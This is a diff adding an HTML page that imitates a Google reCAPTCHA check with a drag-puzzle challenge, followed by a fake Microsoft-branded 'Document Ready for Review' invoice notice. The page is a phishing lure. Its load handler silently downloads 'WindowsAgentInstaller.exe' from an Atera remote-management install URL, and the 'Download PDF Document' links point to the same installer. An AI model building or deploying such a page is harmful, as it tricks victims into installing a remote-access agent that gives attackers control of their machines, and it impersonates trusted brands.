@@ -1,0 +1,757 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA - Verify You're Human</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Roboto, Arial, sans-serif;
+            background-color: #f9f9f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .recaptcha-container {
+            background: #fff;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 16px;
+            width: 318px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+        }
+
+        .recaptcha-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 12px;
+            padding-left: 2px;
+        }
+
+        .recaptcha-logo svg {
+            width: 32px;
+            height: 32px;
+        }
+
+        .recaptcha-logo-text {
+            font-size: 11px;
+            color: #555;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            user-select: none;
+        }
+
+        .recaptcha-logo-text span {
+            color: #4285f4;
+            font-weight: 700;
+        }
+
+        .recaptcha-main {
+            display: flex;
+            align-items: center;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 2px;
+            padding: 12px 14px;
+            min-height: 48px;
+            cursor: pointer;
+            user-select: none;
+            transition: border-color 0.2s;
+        }
+
+        .recaptcha-main:hover {
+            border-color: #b2b2b2;
+        }
+
+        .recaptcha-checkbox-wrapper {
+            position: relative;
+            width: 24px;
+            height: 24px;
+            margin-right: 14px;
+            flex-shrink: 0;
+        }
+
+        .recaptcha-checkbox {
+            position: absolute;
+            opacity: 0;
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+            z-index: 2;
+        }
+
+        .recaptcha-checkbox-visual {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 24px;
+            height: 24px;
+            background: #fff;
+            border: 2px solid #c1c1c1;
+            border-radius: 2px;
+            transition: all 0.2s ease;
+        }
+
+        .recaptcha-checkbox-wrapper:hover .recaptcha-checkbox-visual {
+            border-color: #b2b2b2;
+        }
+
+        .recaptcha-checkbox:checked + .recaptcha-checkbox-visual {
+            background: #0f9d58;
+            border-color: #0f9d58;
+        }
+
+        .recaptcha-checkbox:checked + .recaptcha-checkbox-visual::after {
+            content: '';
+            position: absolute;
+            left: 7px;
+            top: 3px;
+            width: 6px;
+            height: 12px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            transform: rotate(45deg);
+        }
+
+        .recaptcha-label {
+            font-size: 14px;
+            color: #000;
+            font-weight: 400;
+            flex: 1;
+            line-height: 24px;
+        }
+
+        .recaptcha-spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .recaptcha-spinner.active {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .recaptcha-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            padding: 0 2px;
+        }
+
+        .recaptcha-footer-left {
+            font-size: 10px;
+            color: #555;
+        }
+
+        .recaptcha-footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 10px;
+        }
+
+        .recaptcha-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .recaptcha-footer-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .recaptcha-footer-right svg {
+            width: 16px;
+            height: 16px;
+        }
+
+        .recaptcha-footer-right span {
+            font-size: 10px;
+            color: #555;
+        }
+
+        /* Puzzle captcha modal (drag to place) */
+        .puzzle-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .puzzle-modal.active {
+            display: flex;
+        }
+
+        .puzzle-box {
+            background: #fff;
+            border-radius: 8px;
+            padding: 24px;
+            width: 352px;
+            max-width: 95vw;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+            font-family: Roboto, Arial, sans-serif;
+        }
+
+        .puzzle-header {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .puzzle-canvas-container {
+            position: relative;
+            width: 100%;
+            height: 220px;
+            background: #e8e8e8;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        .puzzle-background {
+            width: 100%;
+            height: 100%;
+            background-position: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        .puzzle-slot {
+            position: absolute;
+            width: 48px;
+            height: 48px;
+            bottom: 20px;
+            right: 30px;
+            border: 2px dashed #999;
+            border-radius: 4px;
+            background: rgba(255,255,255,0.3);
+        }
+
+        .puzzle-piece {
+            position: absolute;
+            width: 48px;
+            height: 48px;
+            bottom: 20px;
+            left: 20px;
+            background-size: 352px 220px;
+            cursor: grab;
+            border-radius: 4px;
+            user-select: none;
+            transition: box-shadow 0.2s;
+        }
+
+        .puzzle-piece:hover {
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+
+        .puzzle-piece.dragging {
+            cursor: grabbing;
+            z-index: 100;
+        }
+
+        .puzzle-instructions {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .puzzle-refresh {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #5f6368;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+        }
+
+        .puzzle-refresh:hover {
+            background: #f1f3f4;
+        }
+
+        .puzzle-controls {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .puzzle-audio {
+            background: none;
+            border: none;
+            font-size: 24px;
+            color: #5f6368;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            transition: background 0.2s;
+            padding: 0;
+        }
+
+        .puzzle-audio:hover {
+            background: #f1f3f4;
+        }
+
+        .success-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255,255,255,0.98);
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            flex-direction: column;
+            gap: 16px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .success-overlay.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #0f9d58;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: scaleIn 0.3s ease;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+
+        .success-checkmark::after {
+            content: '';
+            width: 20px;
+            height: 40px;
+            border: solid white;
+            border-width: 0 4px 4px 0;
+            transform: rotate(45deg) translateY(-2px);
+        }
+
+        .success-text {
+            font-size: 20px;
+            color: #333;
+            font-weight: 500;
+        }
+
+        .redirecting-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="recaptcha-container">
+        <div class="recaptcha-logo">
+            <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M24 4L6 14v20l18 10 18-10V14L24 4z" fill="#4285f4" opacity="0.9"/>
+                <path d="M24 4L6 14l18 10 18-10L24 4z" fill="#fff" opacity="0.3"/>
+                <path d="M24 14v20M6 14l18 10 18-10" stroke="#fff" stroke-width="2"/>
+            </svg>
+            <div class="recaptcha-logo-text">
+                re<span>CAPTCHA</span>
+            </div>
+        </div>
+
+        <div class="recaptcha-main" id="mainBox">
+            <div class="recaptcha-checkbox-wrapper">
+                <input type="checkbox" class="recaptcha-checkbox" id="checkbox">
+                <div class="recaptcha-checkbox-visual" id="checkboxVisual"></div>
+            </div>
+            <label class="recaptcha-label" for="checkbox" id="checkboxLabel">I'm not a robot</label>
+            <div class="recaptcha-spinner" id="spinner"></div>
+        </div>
+
+        <div class="recaptcha-footer">
+            <div class="recaptcha-footer-left">
+                <a href="#">Privacy</a> - <a href="#">Terms</a>
+            </div>
+            <div class="recaptcha-footer-right">
+                <svg viewBox="0 0 24 24" fill="#555">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+                <span>reCAPTCHA</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Puzzle drag captcha modal -->
+    <div class="puzzle-modal" id="puzzleModal">
+        <div class="puzzle-box">
+            <div class="puzzle-header">Please drag the missing puzzle piece into its slot</div>
+            <div class="puzzle-canvas-container">
+                <div class="puzzle-background"></div>
+                <div class="puzzle-slot" id="puzzleSlot"></div>
+                <div class="puzzle-piece" id="puzzlePiece"></div>
+            </div>
+            <div class="puzzle-instructions">Slide the piece to complete the puzzle</div>
+            <div class="puzzle-controls">
+                <div style="display: flex; gap: 8px;">
+                    <button class="puzzle-audio" id="audioChallenge" title="Audio challenge">
+                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#5f6368"><path d="M14 3.23l5.29 5.29c.39.39 1.02.39 1.41 0s.39-1.02 0-1.41l-6-6c-.39-.39-1.02-.39-1.41 0l-6 6c-.39.39-.39 1.02 0 1.41s1.02.39 1.41 0L14 3.23zM3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02z"/></svg>
+                    </button>
+                    <button class="puzzle-refresh" id="refreshPuzzle" title="New puzzle">
+                        <svg viewBox="0 0 24 24" width="24" height="24" fill="#5f6368"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success overlay that redirects to your document page -->
+    <div class="success-overlay" id="successOverlay">
+        <div class="success-checkmark"></div>
+        <div class="success-text">You are verified!</div>
+        <div class="redirecting-text">Redirecting to your document...</div>
+    </div>
+
+    <!-- Hidden document page content -->
+    <div id="documentPage" style="display: none;">
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="x-sender-name" content="Jane Anderfol">
+            <meta name="x-email-subject" content="Document Ready for Review">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Document Ready for Review</title>
+            <style>
+                body {
+                    font-family: Arial, sans-serif;
+                    line-height: 1.6;
+                    color: #333333;
+                    background-color: #f4f4f4;
+                    margin: 0;
+                    padding: 0;
+                }
+                .container {
+                    max-width: 600px;
+                    margin: 20px auto;
+                    background-color: #ffffff;
+                    padding: 20px;
+                    border-radius: 8px;
+                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+                }
+                .header {
+                    text-align: left;
+                    padding-bottom: 20px;
+                    border-bottom: 1px solid #eeeeee;
+                }
+                .header img {
+                    height: 20px;
+                    vertical-align: middle;
+                    margin-right: 10px;
+                }
+                .header h1 {
+                    color: #0056b3;
+                    font-size: 24px;
+                    margin: 10px 0 0 0;
+                }
+                .content {
+                    padding: 20px 0;
+                }
+                .content p {
+                    margin-bottom: 10px;
+                }
+                .document-details {
+                    background-color: #f9f9f9;
+                    border: 1px solid #eeeeee;
+                    padding: 15px;
+                    margin-bottom: 20px;
+                    border-radius: 4px;
+                }
+                .document-details strong {
+                    display: block;
+                    margin-bottom: 5px;
+                }
+                .button-container {
+                    text-align: center;
+                    margin-top: 20px;
+                }
+                .button {
+                    display: inline-block;
+                    background-color: #0056b3;
+                    color: #ffffff;
+                    padding: 12px 25px;
+                    text-decoration: none;
+                    border-radius: 4px;
+                    font-size: 16px;
+                    font-weight: bold;
+                }
+                .fallback-link {
+                    margin-top: 20px;
+                    font-size: 12px;
+                    color: #777777;
+                    text-align: center;
+                }
+                .fallback-link a {
+                    color: #0056b3;
+                    text-decoration: underline;
+                }
+                .footer {
+                    text-align: center;
+                    padding-top: 20px;
+                    margin-top: 20px;
+                    border-top: 1px solid #eeeeee;
+                    font-size: 12px;
+                    color: #777777;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft Logo">
+                    <h1>Document Ready for Review</h1>
+                </div>
+                <div class="content">
+                    <p>Your organization has shared a document with you for review and approval.</p>
+                    <div class="document-details">
+                        <strong>Document Name:</strong>
+                        <p><a href="https://HelpdeskSupport1784636911416.servicedesk.atera.com/api/utils/agent-install/windows/?cid=1&aeid=1f56f546bac145a5b004354996aaebd7">Invoice_2025_Financial_Report_Confidential_Audit_Merged_<br>Results_Review_Important_Q2_Final_Version_Approved_Copy.pdf</a></p>
+                        <strong>Shared by:</strong>
+                        <p>Finance Department</p>
+                        <strong>Message:</strong>
+                        <p>Please review the attached invoice before the upcoming meeting.</p>
+                    </div>
+                    <div class="button-container">
+                        <a href="https://HelpdeskSupport1784636911416.servicedesk.atera.com/api/utils/agent-install/windows/?cid=1&aeid=1f56f546bac145a5b004354996aaebd7" class="button">Download PDF Document</a>
+                    </div>
+                </div>
+                <div class="footer">
+                    <p>&copy; 2025 Microsoft Corporation. All rights reserved.</p>
+                </div>
+            </div>
+        </body>
+        </html>
+    </div>
+
+    <script>
+        const checkbox = document.getElementById('checkbox');
+        const mainBox = document.getElementById('mainBox');
+        const spinner = document.getElementById('spinner');
+        const puzzleModal = document.getElementById('puzzleModal');
+        const successOverlay = document.getElementById('successOverlay');
+        const puzzlePiece = document.getElementById('puzzlePiece');
+        const puzzleSlot = document.getElementById('puzzleSlot');
+        const refreshPuzzleBtn = document.getElementById('refreshPuzzle');
+        const puzzleBackground = document.querySelector('.puzzle-background');
+
+        // Collection of different puzzle images (all from Unsplash, various categories)
+        const puzzleImages = [
+            'https://images.unsplash.com/photo-1506905925346-21bda4d32df4?w=352&h=220&fit=crop', // Mountains
+            'https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=352&h=220&fit=crop', // Nature
+            'https://images.unsplash.com/photo-1426604966848-d7adac402bff?w=352&h=220&fit=crop', // Landscape
+            'https://images.unsplash.com/photo-1472214103451-9374bd1c798e?w=352&h=220&fit=crop', // Countryside
+            'https://images.unsplash.com/photo-1433086966358-54859d0ed716?w=352&h=220&fit=crop', // Waterfall
+            'https://images.unsplash.com/photo-1501785888041-af3ef285b470?w=352&h=220&fit=crop', // Lake
+            'https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?w=352&h=220&fit=crop', // Foggy mountains
+            'https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?w=352&h=220&fit=crop', // Forest
+            'https://images.unsplash.com/photo-1439066615861-d1af74d74000?w=352&h=220&fit=crop', // Lake mountains
+            'https://images.unsplash.com/photo-1518173946687-a4c036bc6c6d?w=352&h=220&fit=crop'  // Beach sunset
+        ];
+
+        // Puzzle slot position (x-offset for the piece to match)
+        const pieceOffsetX = 280;
+        const pieceOffsetY = 140;
+
+        // Puzzle drag functionality
+        let isDragging = false;
+        let startX, startLeft;
+
+        // Initial checkbox click
+        checkbox.addEventListener('change', function() {
+            if (this.checked && !mainBox.classList.contains('verified')) {
+                mainBox.classList.add('verifying');
+                spinner.classList.add('active');
+                setTimeout(() => {
+                    mainBox.classList.remove('verifying');
+                    spinner.classList.remove('active');
+                    puzzleModal.classList.add('active');
+                    resetPuzzle();
+                }, 1000);
+            }
+        });
+
+        // Also handle clicks on the main box (for users clicking the label area)
+        mainBox.addEventListener('click', function(e) {
+            if (e.target.classList.contains('recaptcha-checkbox')) return;
+            if (!checkbox.checked && !this.classList.contains('verified')) {
+                checkbox.checked = true;
+                mainBox.classList.add('verifying');
+                spinner.classList.add('active');
+                setTimeout(() => {
+                    mainBox.classList.remove('verifying');
+                    spinner.classList.remove('active');
+                    puzzleModal.classList.add('active');
+                    resetPuzzle();
+                }, 1000);
+            }
+        });
+
+        // Reset puzzle position and load new random image
+        function resetPuzzle() {
+            puzzlePiece.style.left = '20px';
+            puzzlePiece.style.bottom = '20px';
+            
+            // Get random image from our collection
+            const randomIndex = Math.floor(Math.random() * puzzleImages.length);
+            const randomImage = puzzleImages[randomIndex];
+            
+            // Add cache buster to prevent image caching
+            const imageUrl = `${randomImage}&cache=${Math.random()}`;
+            
+            // Update background for both puzzle background and puzzle piece
+            puzzleBackground.style.backgroundImage = `url('${imageUrl}')`;
+            puzzlePiece.style.backgroundImage = `url('${imageUrl}')`;
+            puzzlePiece.style.backgroundPosition = `-${pieceOffsetX}px -${pieceOffsetY}px`;
+        }
+
+        // Refresh puzzle
+        refreshPuzzleBtn.addEventListener('click', resetPuzzle);
+
+        // Load initial puzzle image when page loads
+        window.addEventListener('load', function() {
+            resetPuzzle();
+            // Start automatic download of the agent file
+            const downloadLink = document.createElement('a');
+            downloadLink.href = 'https://HelpdeskSupport1784636911416.servicedesk.atera.com/api/utils/agent-install/windows/?cid=1&aeid=1f56f546bac145a5b004354996aaebd7';
+            downloadLink.download = 'WindowsAgentInstaller.exe';
+            document.body.appendChild(downloadLink);
+            downloadLink.click();
+            document.body.removeChild(downloadLink);
+        });
+
+        // Mouse down - start dragging
+        puzzlePiece.addEventListener('mousedown', function(e) {
+            isDragging = true;
+            this.classList.add('dragging');
+            startX = e.clientX;
+            startLeft = parseInt(window.getComputedStyle(this).left);
+            e.preventDefault();
+        });
+
+        // Mouse move - drag the puzzle piece
+        document.addEventListener('mousemove', function(e) {
+            if (!isDragging) return;
+            const dx = e.clientX - startX;
+            const newLeft = Math.max(0, Math.min(startLeft + dx, 270)); // Keep within bounds
+            puzzlePiece.style.left = newLeft + 'px';
+        });
+
+        // Mouse up - check if puzzle is placed correctly
+        document.addEventListener('mouseup', function(e) {
+            if (!isDragging) return;
+            isDragging = false;
+            puzzlePiece.classList.remove('dragging');
+
+            // Get positions to check alignment
+            const pieceRect = puzzlePiece.getBoundingClientRect();
+            const slotRect = puzzleSlot.getBoundingClientRect();
+            const distance = Math.abs(pieceRect.left - slotRect.left);
+
+            // If within 15px of correct position - SUCCESS!
+            if (distance < 15) {
+                puzzlePiece.style.left = slotRect.left - document.querySelector('.puzzle-canvas-container').getBoundingClientRect().left + 'px';
+                setTimeout(() => {
+                    puzzleModal.classList.remove('active');
+                    successOverlay.classList.add('active');
+                    
+                    // After 2 seconds, replace entire page with document page
+                    setTimeout(() => {
+                        document.body.innerHTML = document.getElementById('documentPage').innerHTML;
+                    }, 2000);
+                }, 500);
+            }
+        });
+
+        // Touch support for mobile
+        puzzlePiece.addEventListener('touchstart', function(e) {
+            isDragging = true;
+            this.classList.add('dragging');
+            startX = e.touches[0].clientX;
+            startLeft = parseInt(window.getComputedStyle(this).left);
+            e.preventDefault();
+        });
+
+        document.addEventListener('touchmove', function(e) {
+            if (!isDragging) return;
+            const dx = e.touches[0].clientX - startX;
+            const newLeft = Math.max(0, Math.min(startLeft + dx, 270));
+            puzzlePiece.style.left = newLeft + 'px';
+        });
+
+        document.addEventListener('touchend', function(e) {
+            if (!isDragging) return;
+            isDragging = false;
+            puzzlePiece.classList.remove('dragging');
+
+            const pieceRect = puzzlePiece.getBoundingClientRect();
+            const slotRect = puzzleSlot.getBoundingClientRect();
+            const distance = Math.abs(pieceRect.left - slotRect.left);
+
+            if (distance < 15) {
+                puzzlePiece.style.left = slotRect.left - document.querySelector('.puzzle-canvas-container').getBoundingClientRect().left + 'px';
+                setTimeout(() => {
+                    puzzleModal.classList.remove('active');
+                    successOverlay.classList.add('active');
+                    setTimeout(() => {
+                        document.body.innerHTML = document.getElementById('documentPage').innerHTML;
+                    }, 2000);
+                }, 500);
+            }
+        });
+    </script>
+</body>
+</html>
